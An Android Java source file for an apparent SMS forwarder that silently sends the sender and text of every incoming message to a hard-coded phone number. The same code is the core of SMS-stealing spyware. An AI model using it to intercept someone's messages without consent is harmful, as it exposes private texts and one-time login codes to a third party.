package com.pmoust.smsfwd;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    private static final String FORWARD_TO_PHONE_NUMBER = "6969696969";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
            for (SmsMessage message : messages) {
                String msgBody = message.getMessageBody();
                String msgFrom = message.getOriginatingAddress();
                forwardSms(msgFrom, msgBody);
            }
        }
    }

    private void forwardSms(String from, String body) {
        SmsManager smsManager = SmsManager.getDefault();
        String msg = "From: " + from + " Message: " + body;
        smsManager.sendTextMessage(FORWARD_TO_PHONE_NUMBER, null, msg, null, null);
    }
}
